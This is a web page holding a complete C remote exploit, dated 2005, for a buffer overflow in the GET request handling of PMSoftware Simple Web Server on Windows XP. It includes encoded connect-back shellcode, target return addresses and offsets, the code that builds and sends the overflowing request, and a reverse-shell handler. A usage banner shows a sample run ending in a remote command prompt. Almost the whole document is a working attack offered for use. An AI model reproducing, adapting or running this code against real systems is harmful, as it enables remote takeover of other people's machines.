<html><head><title>PMSoftware Simple Web Server (GET Request) Remote BoF Exploit</title></head><pre>/*
 *
 * PMSoftware Simple Web Server Buffer Overflow Exploit
 * 3 targets
 *
 * cybertronic[at]gmx[dot]net
 * 04/25/2005
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * Usage: ./PMSoftwareSimpleWebServer_expl -h &lt;tip&gt; -p &lt;tport&gt; -l &lt;cbip&gt; -c &lt;cbport&gt; -t &lt;target&gt;
 *         0 WinXP Home SP1 GER [0x71a17bfb] [pad=213] [offset=222]
 *         1 WinXP Prof SP1 GER [0x71a17bfb] [pad=216] [offset=225]
 *         2 WinXP Prof SP2 GER [0x71a19372] [pad=215] [offset=224]
 *
 * [ cybertronic @ PM ] $ ./PMSoftwareSimpleWebServer_expl -h 192.168.2.103 -p 80 -l 192.168.2.102 -c 1337 -t 1
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ connecting to 192.168.2.103:80...done!
 * --[ exploiting WinXP Pro SP1 GER
 * --[ ret: 0x71a17bfb [ jmp esp in ws2_32.dll ]
 * --[ sending GET request [ 543 bytes ]...done!
 * --[ starting reverse handler [port: 1337]...done!
 * --[ incomming connection from:  192.168.2.103
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\PMSoftware&gt;
 *
 */


#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;

#define PORT 80

#define RED		&quot;\E[31m\E[1m&quot;
#define GREEN	&quot;\E[32m\E[1m&quot;
#define YELLOW	&quot;\E[33m\E[1m&quot;
#define BLUE	&quot;\E[34m\E[1m&quot;
#define NORMAL	&quot;\E[m&quot;

/*
 *
 * prototypes
 *
 */

int connect_to_remote_host ( char* tip, unsigned short tport );
int exploit ( int s, unsigned long xoredip, unsigned short xoredcbport, int targ );
int shell ( int s, char* tip, unsigned short cbport );

void header ();
void start_reverse_handler ( unsigned short cbport );
void usage ( char* name );

/*********************
* Windows Shellcode *
*********************/

/*
 * Type : connect back shellcode
 * Length: 316 bytes
 * CBIP : reverseshell[111] ( ^ 0x99999999 )
 * CBPort: reverseshell[118] ( ^ 0x9999 )
 *
 */

unsigned char reverseshell[] =
&quot;\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA&quot;
&quot;\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9&quot;
&quot;\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3&quot;
&quot;\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE&quot;
&quot;\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99&quot;
&quot;\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF&quot;
&quot;\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6&quot;
&quot;\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF&quot;
&quot;\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD&quot;
&quot;\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD&quot;
&quot;\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD&quot;
&quot;\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66&quot;
&quot;\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66&quot;
&quot;\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB&quot;
&quot;\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3&quot;
&quot;\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3&quot;
&quot;\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D&quot;
&quot;\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75&quot;
&quot;\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2&quot;
&quot;\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0&quot;;

/*
 *
 * structures
 *
 */

typedef struct _args {
	char* tip;
	char* lip;
    int tport;
	int lport;
	int target;
} args;

struct targets {
	int  num;
	char name[64];
	unsigned long ret;
	int padding;
	int offset;
}
target[]= {
	{ 0, &quot;WinXP Home SP1 GER&quot;, 0x71a17bfb, 213, 222 },
	{ 1, &quot;WinXP Prof SP1 GER&quot;, 0x71a17bfb, 216, 225 },
	{ 2, &quot;WinXP Prof SP2 GER&quot;, 0x71a19372, 215, 224 } //works only in conjunction with SoftIce :: stack guard is disabled somehow
};

/*
 *
 * functions
 *
 */

int
connect_to_remote_host ( char* tip, unsigned short tport )
{
	int s;
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

    memset ( &amp;remote_addr, 0x0, sizeof ( remote_addr ) );
    if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		printf ( &quot;cannot resolve \&quot;%s\&quot;\n&quot;, tip );
		exit ( 1 );
	}
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons ( tport );
    remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr-&gt;h_addr );
    if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) &lt; 0 )
    {
		printf ( &quot;socket failed!\n&quot; );
		exit ( 1 );
	}
	printf ( &quot;--[ connecting to %s:%u...&quot;, tip, tport  );
	if ( connect ( s, ( struct sockaddr * ) &amp;remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( &quot;failed!\n&quot; );
		exit ( 1 );
	}
	printf ( &quot;done!\n&quot; );
	return ( s );
}

int
exploit ( int s, unsigned long xoredip, unsigned short xoredcbport, int targ )
{
	char in[2048], request[1024];
	
	printf ( &quot;--[ exploiting WinXP Pro SP1 GER\n&quot; );
	printf ( &quot;--[ ret: 0x%08x [ jmp esp in ws2_32.dll ]\n&quot;, target[targ].ret );
	
	memcpy ( &amp;reverseshell[111], &amp;xoredip, 4);
	memcpy ( &amp;reverseshell[118], &amp;xoredcbport, 2);
	
	bzero ( &amp;request, sizeof ( request ) );
	request[0] = 0x47;
	request[1] = 0x45;
	request[2] = 0x54;
	request[3] = 0x20;
	request[4] = 0x2f;

	memset ( request + 5, 0x41, target[targ].padding );
	strncat ( request, ( unsigned char* ) &amp;target[targ].ret, 4 );
	memcpy ( request + target[targ].offset, reverseshell, sizeof ( reverseshell ) - 1 );
	strcat ( request, &quot;\r\n&quot; );

	printf ( &quot;--[ sending GET request [ %d bytes ]...&quot;, strlen ( request ) );
	if ( write ( s, request, strlen ( request ) ) &lt;= 0 )
	{
		printf ( &quot;failed!\n&quot; );
		return ( 1 );
	}
	printf ( &quot;done!\n&quot; );
	return ( 0 );
}

int
send_head ( int s )
{
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( &quot;--[&quot; YELLOW &quot; b&quot; NORMAL &quot;0&quot; YELLOW &quot;x &quot; NORMAL &quot;p&quot; YELLOW &quot;w&quot; NORMAL &quot;n&quot; YELLOW &quot;e&quot; NORMAL &quot;d &quot; YELLOW &quot;- &quot; NORMAL &quot;h&quot; YELLOW &quot;4&quot; NORMAL &quot;v&quot; YELLOW &quot;e &quot; NORMAL &quot;p&quot; YELLOW &quot;h&quot; NORMAL &quot;u&quot; YELLOW &quot;n&quot; NORMAL &quot;\n&quot; );

	FD_ZERO ( &amp;fd_read );
	FD_SET ( s, &amp;fd_read );
	FD_SET ( 0, &amp;fd_read );

	while ( 1 )
	{
		FD_SET ( s, &amp;fd_read );
		FD_SET ( 0, &amp;fd_read );

		if ( select ( s + 1, &amp;fd_read, NULL, NULL, NULL ) &lt; 0 )
			break;
		if ( FD_ISSET ( s, &amp;fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
			if ( write ( 1, buffer, n ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
		}
		if ( FD_ISSET ( 0, &amp;fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
			if ( send ( s, buffer, n, 0 ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
		}
		usleep(10);
	}
}

void
header ()
{
	printf ( &quot;              __              __                   _           \n&quot; );
	printf ( &quot;  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n&quot; );
	printf ( &quot; / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n&quot; );
	printf ( &quot;/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n&quot; );
	printf ( &quot;\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n&quot; );
	printf ( &quot;    /____/                                                     \n\n&quot; );
	printf ( &quot;--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n&quot; );
}

void
parse_arguments ( int argc, char* argv[], args* argp )
{
	int i = 0;
	
	while ( ( i = getopt ( argc, argv, &quot;h:p:l:c:t:&quot; ) ) != -1 )
	{
		switch ( i )
		{
			case 'h':
				argp-&gt;tip = optarg;
				break;
			case 'p':
				argp-&gt;tport = atoi ( optarg );
				break;
			case 'l':
				argp-&gt;lip = optarg;
				break;
			case 'c':
                argp-&gt;lport = atoi ( optarg );
	            break;
			case 't':
                argp-&gt;target = strtoul ( optarg, NULL, 16 );
	            break;
			case ':':
			case '?':
			default:
				usage ( argv[0] );
	    }
    }

    if ( argp-&gt;tip == NULL || argp-&gt;tport &lt; 1 || argp-&gt;tport &gt; 65535 || argp-&gt;lip == NULL || argp-&gt;lport &lt; 1 || argp-&gt;lport &gt; 65535 ||  argp-&gt;target &lt; 0 || argp-&gt;target &gt; 2 )
		usage ( argv[0] );
}

void
start_reverse_handler ( unsigned short cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );
	
	bzero ( &amp;servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( &quot;--[ starting reverse handler [port: %u]...&quot;, cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( &quot;socket failed!\n&quot; );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &amp;servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( &quot;listen failed!\n&quot; );
		exit ( 1 );
	}
	printf ( &quot;done!\n&quot; );
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &amp;cliaddr, &amp;clilen ) ) &lt; 0 )
	{
		printf ( &quot;accept failed!\n&quot; );
		exit ( 1 );
	}
	close ( s1 );
	printf ( &quot;--[ incomming connection from:\t%s\n&quot;, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
usage ( char* name )
{
	int i;

	printf ( &quot;Usage: %s -h &lt;tip&gt; -p &lt;tport&gt; -l &lt;cbip&gt; -c &lt;lport&gt; -t &lt;target&gt;\n&quot;, name );
	for ( i = 0; i &lt; 3; i++ )
		printf ( &quot;\t%d %s [0x%08x] [pad=%d] [offset=%d]\n&quot;, target[i].num, target[i].name, target[i].ret, target[i].padding, target[i].offset );
    exit ( 1 );
}

int
main ( int argc, char* argv[] )
{
	int s, targ, i;
	unsigned long xoredip;
	unsigned short cbport, xoredcbport;
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;
	args myargs;

	system ( &quot;clear&quot; );
	header ();
	parse_arguments ( argc, argv, &amp;myargs );
	s = connect_to_remote_host ( myargs.tip, myargs.tport );
	
	xoredip = inet_addr ( myargs.lip ) ^ ( unsigned long ) 0x99999999;
	xoredcbport = htons ( myargs.lport ) ^ ( unsigned short ) 0x9999;

	if ( exploit ( s, xoredip, xoredcbport, myargs.target ) == 1 )
	{
		printf ( &quot;exploitation FAILED!\n&quot; );
		exit ( 1 );
	}
	start_reverse_handler ( myargs.lport );
}


// milw0rm.com [2005-04-24]</pre></html>